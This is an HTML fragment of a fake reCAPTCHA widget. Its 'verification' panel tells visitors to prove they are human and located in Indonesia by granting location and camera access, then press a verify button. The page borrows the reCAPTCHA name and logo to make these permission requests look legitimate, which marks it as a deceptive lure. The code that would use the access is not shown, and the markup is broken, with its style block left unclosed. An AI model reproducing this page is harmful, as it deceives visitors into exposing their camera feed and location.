<body>
    <style>
   .teks,li{display:flex}ul{list-style:none;padding-left:0}li{align-items:center;gap:23px}.angka{color:#007bff;font-size:1.2em;font-weight:700;min-width:-50px;text-align:right}.teks{align-items:center;gap:5px}

    <div class="recaptcha-box">
        <div class="recaptcha-header">
            <input type="checkbox" id="recaptcha-checkbox">
            <label for="recaptcha-checkbox" class="recaptcha-label">
                <span class="recaptcha-text">I'm not a robot</span>
            </label>
            <div class="recaptcha-logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" alt="reCAPTCHA">
            </div>
        </div>

        <div class="verification-box" id="verification-box">
            <p>To prove you are located in Indonesia & you are a human, please:</p>
            <ul>
                <li>
                    <span class="angka">1.</span>
                    <span class="teks">Allow Location <img src="/src/assets/lokasi.png" alt="Lokasi" width="15"> access.</span>
                </li>
                <li>
                    <span class="angka">2.</span>
                    <span class="teks">Allow Camera <img src="/src/assets/kamera.png" alt="Kamera" width="20"> access.</span>
                </li>
            </ul>
            <p class="user-id">Unique Verification ID: 2155</p>
            
            <div class="captcha-loading" id="loading"></div>
            <button class="verify-button" id="verify-btn">verification</button>
        </div>        

        <p class="recaptcha-footer">reCAPTCHA - <a href="#">Privacy</a> - <a href="#">Terms</a></p>
